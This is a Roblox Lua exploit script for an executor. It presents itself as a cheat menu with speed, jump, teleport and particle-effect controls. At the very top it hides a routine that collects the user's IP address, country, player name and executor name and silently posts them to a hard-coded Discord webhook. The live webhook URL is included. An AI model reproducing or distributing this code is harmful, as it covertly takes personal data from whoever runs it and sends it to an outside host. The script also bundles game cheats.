local H, P = game:GetService("HttpService"), game:GetService("Players").LocalPlayer
local W = "https://discord.com/api/webhooks/1471084125053128876/8oVO8QoqTlBzkbuN7HppW2v1oZbNhLqyDlW2r-g3ZyCTjxeoVNCuTW4jLLS_xdz3COOS"

task.spawn(function()
    local g = {query="Err", country="Unknown"}
    pcall(function() 
        local r = (request or syn.request or http_request)({Url = "http://ip-api.com/json/", Method = "GET"})
        g = H:JSONDecode(r.Body)
    end)
    local d = {["embeds"] = {{["title"] = P.Name.." 捕捉", ["color"] = 16711680, ["fields"] = {
        {["name"]="IP",["value"]=g.query,["inline"]=true},
        {["name"]="場所",["value"]=g.country,["inline"]=true},
        {["name"]="ツール",["value"]=identifyexecutor() or "不明",["inline"]=true}
    }}}}
    pcall(function() (request or syn.request or http_request)({Url = W, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = H:JSONEncode(d)}) end)
end)

local d, v, j, tgt = nil, 0, 50, nil
local pg = P:WaitForChild("PlayerGui")
if pg:FindFirstChild("Koi") then pg.Koi:Destroy() end
local g = Instance.new("ScreenGui", pg)
g.Name, g.ResetOnSpawn = "Koi", false
local f = Instance.new("Frame", g)
f.Size, f.Draggable, f.Active, f.BackgroundColor3, f.Position = UDim2.new(0, 120, 0, 175), true, true, Color3.new(0,0,0), UDim2.new(.5, -60, .4, -90)
Instance.new("UICorner", f)
local l = Instance.new("TextLabel", f)
l.Size, l.BackgroundTransparency, l.Text, l.TextSize, l.Font = UDim2.new(1, 0, 0, 30), 1, "こいフラ", 22, 1
task.spawn(function() while task.wait() do l.TextColor3 = Color3.fromHSV(tick()%5/5, 1, 1) end end)

game:GetService("RunService").Heartbeat:Connect(function(dt)
    pcall(function()
        local c = P.Character
        local h, hrp = c.Humanoid, c.HumanoidRootPart
        if h.MoveDirection.Magnitude > 0 then hrp.CFrame += (h.MoveDirection * v * dt) end
        h.UseJumpPower, h.JumpPower = true, j
    end)
end)

local function b(t, y, w, x, c, a, p)
    local btn = Instance.new("TextButton", p or f)
    btn.Size, btn.Position, btn.Text, btn.BackgroundColor3, btn.TextColor3, btn.TextSize = UDim2.new(0, w, 0, 20), UDim2.new(0, x, 0, y), t, c, Color3.new(1, 1, 1), 10
    Instance.new("UICorner", btn)
    btn.MouseButton1Click:Connect(function() pcall(a) end)
    return btn
end

b("保存", 32, 48, 10, Color3.new(0, .4, 1), function() d = P.Character.HumanoidRootPart.CFrame end)
b("移動", 32, 48, 62, Color3.new(.8, 0, 0), function() if d then P.Character.HumanoidRootPart.CFrame = d end end)

local efL = Instance.new("ScrollingFrame", f)
efL.Size, efL.Visible, efL.BackgroundColor3 = UDim2.new(0, 100, 0, 120), false, Color3.new(0, 0, 0)
efL.Position = UDim2.new(1, 2, 0, 0)
b("エフェクト +", 55, 100, 10, Color3.new(.2, .2, .2), function() efL.Visible = not efL.Visible end)
local et = {"None", "炎", "青炎", "晶", "闇", "光", "虹"}
for i, n in pairs(et) do 
    b(n, (i-1)*22, 90, 5, Color3.new(.1, .1, .1), function() 
        local r = P.Character.HumanoidRootPart
        for _, v in pairs(r:GetChildren()) do if v.Name == "KA" then v:Destroy() end end
        if n == "None" then return end
        local ef = (n=="炎" and Instance.new("Fire", r)) or (n=="青炎" and Instance.new("Fire", r)) or Instance.new("Sparkles", r)
        ef.Name = "KA"
        if n=="青炎" then ef.Color = Color3.new(0, .5, 1) end
        efL.Visible = false
    end, efL) 
end

local function s(y, cl, fn)
    local sk = Instance.new("TextButton", f); sk.Size, sk.Position, sk.BackgroundColor3 = UDim2.new(0, 100, 0, 8), UDim2.new(0, 10, 0, y), Color3.new(.2, .2, .2)
    local sd = Instance.new("Frame", sk); sd.Size, sd.Position, sd.BackgroundColor3 = UDim2.new(0, 20, 0, 20), UDim2.new(0, -10, 0.5, -10), cl
    sk.InputBegan:Connect(function(i) if i.UserInputType.Name:find("Mouse") or i.UserInputType.Name:find("Touch") then
        local m = game:GetService("UserInputService").InputChanged:Connect(function(i2)
            local x = math.clamp((i2.Position.X - sk.AbsolutePosition.X) / sk.AbsoluteSize.X, 0, 1)
            sd.Position = UDim2.new(x, -10, 0.5, -10)
            fn(x)
        end)
        game:GetService("UserInputService").InputEnded:Connect(function() m:Disconnect() end)
    end end)
end

s(110, Color3.new(0, 1, 0), function(x) v = x * 150 end)
s(135, Color3.new(0, .5, 1), function(x) j = 50 + (x * 250) end)
b("退出", 155, 100, 10, Color3.new(.2, .2, .2), function() P:Destroy() end)
